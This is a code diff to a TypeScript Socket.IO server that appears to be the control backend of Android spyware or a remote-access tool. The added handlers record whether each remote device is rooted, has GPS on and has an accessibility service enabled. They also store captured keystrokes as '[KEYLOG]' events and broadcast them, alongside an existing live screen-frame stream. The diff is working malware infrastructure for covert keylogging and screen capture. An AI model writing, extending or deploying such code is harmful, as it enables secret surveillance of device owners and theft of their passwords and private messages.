@@ -29,6 +29,11 @@ export function setupSocket(io: SocketIoServer) {
         });
 
         io.emit("device:status", { deviceId: id, status: "online", socketId: socket.id });
+        io.emit("device:connected", {
+          deviceId: id,
+          deviceName: device.name,
+          createdAt: new Date().toISOString(),
+        });
         io.emit("event:new", {
           deviceId: id,
           deviceName: device.name,
@@ -41,6 +46,42 @@ export function setupSocket(io: SocketIoServer) {
 
     socket.on("device:stream", (data: { deviceId: number; frame: string }) => {
       socket.broadcast.emit("stream:frame", data);
+    });
+
+    socket.on("device:capabilities", async (data: {
+      deviceId: number;
+      hasRoot?: boolean;
+      gpsActive?: boolean;
+      accessibilityOn?: boolean;
+      batteryLevel?: number;
+    }) => {
+      const update: Record<string, unknown> = { lastSeen: new Date() };
+      if (data.hasRoot !== undefined) update.hasRoot = data.hasRoot;
+      if (data.gpsActive !== undefined) update.gpsActive = data.gpsActive;
+      if (data.accessibilityOn !== undefined) update.accessibilityOn = data.accessibilityOn;
+      if (data.batteryLevel !== undefined) update.batteryLevel = data.batteryLevel;
+
+      await db.update(devicesTable).set(update).where(eq(devicesTable.id, data.deviceId));
+      io.emit("device:capabilities:update", { deviceId: data.deviceId, ...data });
+    });
+
+    socket.on("device:keylog", async (data: { deviceId: number; text: string }) => {
+      const device = await db.query.devicesTable.findFirst({
+        where: eq(devicesTable.id, data.deviceId),
+      });
+      if (!device) return;
+      await db.insert(eventsTable).values({
+        deviceId: data.deviceId,
+        type: "keylog",
+        message: `[KEYLOG] ${data.text}`,
+      });
+      io.emit("event:new", {
+        deviceId: data.deviceId,
+        deviceName: device.name,
+        type: "keylog",
+        message: `[KEYLOG] ${data.text}`,
+        createdAt: new Date().toISOString(),
+      });
     });
 
     socket.on("device:event", async (data: { deviceId: number; type: string; message: string }) => {
